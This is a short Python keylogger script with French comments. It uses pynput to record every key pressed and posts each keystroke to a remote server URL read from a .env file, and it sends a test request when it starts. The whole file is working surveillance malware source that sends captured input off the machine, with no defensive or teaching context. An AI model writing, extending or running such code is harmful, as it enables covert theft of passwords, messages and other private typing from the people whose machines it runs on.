from httpcore import URL
from pynput import keyboard
import requests
import os 
from dotenv import load_dotenv
from pathlib import Path


ROOT_DIR = Path(__file__).parent

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE_DIR, "log.txt")

load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
SERVER_URL = os.environ['SERVER_URL']


# Fichier local pour enregistrer mes codes



requests.post(SERVER_URL, json={"content": "test"})
# Fonction pour enregistrer les frappes dans un fichier
def on_press(key):

    payload = {"content": str(key)}
    try:
      requests.post(SERVER_URL, json={"content": str(key)}, timeout=5)

    except Exception as e:
        print(f"Erreur d'enregistrement: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Arrêter le keylogger si la touche ESC est pressée
        return False

# Démarre l'écoute des frappes
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
